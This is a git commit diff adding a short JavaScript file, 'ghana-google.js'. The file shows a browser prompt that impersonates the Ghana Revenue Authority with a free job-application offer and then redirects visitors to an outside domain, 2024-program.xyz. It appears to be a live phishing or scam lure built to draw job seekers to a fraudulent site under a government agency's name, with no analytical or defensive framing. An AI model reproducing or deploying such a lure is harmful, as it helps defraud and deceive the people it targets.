5b035106fc5f3c7c56bca722c48a0ff2133780b1
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-09 00:17:01 -0700

    Create ghana-google.js

---
+++ ghana-google.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('GRA: Dear Applicants The Ghana Revenue Authority will never ask you for money for job applications, Application is free kindly press 1 to Apply Now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/ghana';
+}
